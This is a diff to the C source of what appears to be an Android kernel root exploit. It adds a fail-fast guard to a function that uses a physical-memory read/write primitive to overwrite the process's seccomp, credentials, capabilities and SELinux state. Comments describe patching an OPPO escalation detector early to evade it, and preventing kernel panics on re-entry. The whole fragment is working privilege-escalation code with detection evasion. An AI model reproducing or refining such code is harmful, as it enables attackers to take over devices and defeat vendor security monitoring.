@@ -1178,6 +1178,15 @@ static int patch_oplus_root_check(int fd) {
 }
 
 int install_android_root(int fd) {
+  /* round5 fail-fast: once the write stage below has touched kernel memory
+   * (seccomp/cred/caps/selinux), a second pass over the half-patched state
+   * corrupts shared structures (init release_task Oops -> panic).  The
+   * in-function self-patch path is unaffected -- this only blocks a fresh
+   * re-entry after a previous call already wrote and failed. */
+  if (atomic_load(&root_stage_dirty)) {
+    pr_warning("root stage dirty (kernel already patched); refusing re-entry\n");
+    return 0;
+  }
   root_uid_before = getuid();
   /* v21: patch the OPPO escalation detector at the EARLIEST possible
    * point.  The physrw fd is already live here (route stage proved it
@@ -1299,6 +1308,9 @@ int install_android_root(int fd) {
   pipe_phys_read_data(
       fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
       sizeof(real_caps_before));
+  /* Last safe point: everything below writes kernel memory.  Once written,
+   * this process must never re-enter the root stage (root_stage_dirty). */
+  atomic_store(&root_stage_dirty, 1);
   if (!patch_task_seccomp(fd, current_task_addr)) {
     pr_info("root patch seccomp failed task=%016llx\n",
             (unsigned long long)current_task_addr);
